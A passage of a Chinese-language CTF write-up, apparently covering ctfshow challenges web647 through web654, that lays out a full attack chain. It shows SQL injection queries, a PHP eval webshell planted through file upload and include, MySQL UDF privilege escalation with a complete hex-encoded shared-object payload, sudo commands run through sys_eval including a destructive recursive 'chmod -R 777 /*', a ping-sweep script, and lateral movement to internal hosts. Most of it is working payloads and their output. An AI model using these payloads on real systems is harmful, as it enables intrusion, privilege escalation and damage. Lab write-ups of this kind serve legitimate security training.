&#x27;array?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web647,返回值是个数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilString&amp;m=getallheaders</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<p>web648</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilClass&amp;m=1&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<p>web649,NULL绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=evilNumber&amp;m=&amp;key=flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<p>web650</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<p>web651</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $ctfshow = 1;</span><br><span class="line">    public $username = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize(new ctfshow));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/users.php?action=evilArray&amp;m=O%3A7%3A&quot;ctfshow&quot;%3A2%3A&#123;s%3A7%3A&quot;ctfshow&quot;%3Bi%3A1%3Bs%3A8%3A&quot;username&quot;%3Bi%3A2%3B&#125;&amp;key=flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<p>web652</p>
<p>page.php 初注入，或者sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>返回：information_schema,test,mysql,performance_schema,ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1) union select group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77%23</span><br></pre></td></tr></table></figure>

<p>返回：ctfshow_keys,ctfshow_secret,ctfshow_users</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0) union select group_concat(column_name) from information_schema.columns where table_name=0x63746673686f775f736563726574%23</span><br></pre></td></tr></table></figure>

<p>返回：secret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page.php?id=0) union select secret from ctfshow_secret%23</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_652=ctfshow&#123;4b37ab4b6504d43ea0de9a688f0e3ffa&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>

<p>查看，key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select `key` from ctfshow_keys%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key_is_here_you_know</span><br></pre></td></tr></table></figure>

<p>common.php,文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;dbutil.php&#x27;;</span><br><span class="line">if($_GET[&#x27;k&#x27;]!==shell_exec(&#x27;cat /FLAG/FLAG651&#x27;))&#123;</span><br><span class="line">    die(&#x27;651flag未拿到&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]) &amp;&amp; file_exists($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if(db::get_key()==$_POST[&#x27;key&#x27;])&#123;</span><br><span class="line">        include __DIR__.DIRECTORY_SEPARATOR.$_POST[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>init.php</code>得到了db文件位置，<code>/db/data_you_never_know.db</code></li>
</ul>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>数据恢复处上传文件，名字为1.dat  ，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<p>文件包含，即可命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;echo &#x27;PD89ZXZhbCgkX1BPU1RbMV0pPz4=&#x27; | base64 -d &gt; zhou.php&quot;);</span><br></pre></td></tr></table></figure>

<p>密码为1</p>
<p>getshell 但发现把命令执行函数都都禁用了，没能绕过disable_function,</p>
<p>查看这个文件发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/dbutil.php</span><br></pre></td></tr></table></figure>

<p>数据库信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数据库连接</p>
<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p>在sqlmap 里有udf提权的文件，不同的SQLmap ,位置可能不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<p>由于加密过，需要用sqlmap,里的cloak.py -d -i 进行解密，解密后会在相同文件下生成</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203117.png"></p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203252.png"></p>
<p>lib_mysqludf_sys.so,为生成的解密后，再将这个010打开，转为16进制，去掉换行，空格</p>
<p>生成文本，传入下面，由于过程比较复杂，所以，直接拿别人生成好的用，</p>
<p>推荐两个网站so,为16进制</p>
<p><a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a></p>
<p><a href="https://www.isisy.com/1248.html">UDF文件十六进制编码 - Is Yang’s Blog (isisy.com)</a></p>
<p>适用于<strong>64位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>适用于<strong>32位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666fffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=file_put_contents(&#x27;udf.txt&#x27;,hex2bin(&#x27;7F454C4602010100000000000000000003003E00&#x27;));</span><br></pre></td></tr></table></figure>

<p>查看插件位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure>

<p>查看是否能够写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530213014.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=shell_exec(&#x27;cp udf.txt /usr/lib/mariadb/plugin/udf.so&#x27;);</span><br></pre></td></tr></table></figure>

<p>蚁剑执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530204447.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo cat /root/you_win&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo chmod -R 777 /*&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;cat /F*/F*&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctfshow&quot;);</span><br><span class="line">$tmp = $mysqli-&gt;query($_POST[&#x27;sql&#x27;]);</span><br><span class="line">$result = $tmp-&gt;fetch_all();</span><br><span class="line">print_r($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>由于shell 带不出来，disable_function也绕不过去，所以，就还是用shell打吧；蚁剑连接还可以上传文件，这个差不多够了</p>
<p>查看网段cat &#x2F;etc&#x2F;hosts </p>
<p>172.2.132.4</p>
<p>cat &#x2F;etc&#x2F;hosts</p>
<p>scan.sh 运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for ip in `seq 1 50`</span><br><span class="line">  do</span><br><span class="line">   &#123;</span><br><span class="line">  ping -c 1 172.2.132.$ip &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    if [ $? -eq 0 ];then</span><br><span class="line">     echo 172.2.132.$ip UP</span><br><span class="line">    else</span><br><span class="line">     echo 172.2.132.$ip DOWN</span><br><span class="line">   fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.2.132.1 UP</span><br><span class="line">172.2.132.4 UP</span><br><span class="line">172.2.132.2 UP</span><br><span class="line">172.2.132.3 UP</span><br><span class="line">172.2.132.7 UP</span><br><span class="line">172.2.132.5 UP</span><br><span class="line">172.2.132.6 UP</span><br></pre></td></tr></table></figure>

<p>信息搜集一下，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/phpinfo.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>disallowed &#x2F;public&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/public/Readme.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>恭喜师傅来到第二关！ 第二关相比第一关，依旧是没有难度。 glhf!                ctshow 大菜鸡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo `wget http://172.2.132.5/www.zip`;</span><br></pre></td></tr></table></figure>

<p>，然后，访问下载，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">login</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">index</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">main</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line">    	<span 